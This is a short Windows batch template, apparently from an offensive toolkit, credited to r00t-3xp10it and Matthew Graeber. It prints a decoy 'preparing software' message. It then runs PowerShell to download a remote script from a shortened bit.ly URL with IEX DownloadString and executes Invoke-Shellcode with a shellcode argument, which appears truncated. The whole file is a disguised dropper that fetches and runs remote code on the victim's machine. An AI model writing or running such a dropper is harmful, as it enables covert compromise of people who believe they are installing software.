:: batch template | Author: r00t-3xp10it
:: Credits: Matthew Graeber
:: ---
@echo off
echo [*] Please wait, preparing software ...
powershell.exe -Command IEX (New-Object system.Net.WebClient).DownloadString("http://bit.ly/14bZZ0c");Invoke-Shellcode -Force -Shellcode InJ3C
